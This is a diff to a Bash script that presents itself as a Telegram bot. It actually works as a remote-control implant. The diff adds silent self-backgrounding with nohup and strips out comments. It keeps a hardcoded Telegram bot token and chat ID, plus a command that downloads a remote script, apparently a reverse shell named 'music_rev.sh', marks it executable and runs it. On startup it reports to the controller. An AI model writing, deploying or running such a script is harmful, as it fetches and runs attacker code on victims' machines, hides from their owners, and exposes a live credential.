@@ -2,14 +2,19 @@
 # commamnder.sh — Bash Telegram bot using Node.js to parse JSON
 # Usage: ./commamnder.sh
 # Requires: curl + node
-# Edit HARDCODE_CMD below.
+
+# Auto-background if not already
+if [[ "$1" != "--background" ]]; then
+    nohup "$0" --background >/dev/null 2>&1 &
+    exit 0
+fi
 
 set -euo pipefail
 
 ################ CONFIG ################
 TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
 CHAT_ID="6565158025"
-HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"   # <-- replace this with your hardcoded command
+HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"
 ########################################
 
 API="https://api.telegram.org/bot${TOKEN}"
@@ -28,7 +33,6 @@ send_file() {
     -F document=@"$file" >/dev/null
 }
 
-# node parser: reads JSON from stdin and prints update_id|chat_id|text
 parse_updates_node() {
   node -e '
     const fs = require("fs");
@@ -46,7 +50,6 @@ parse_updates_node() {
   '
 }
 
-# notify on startup
 send_msg "ready to execute command"
 
 OFFSET=0
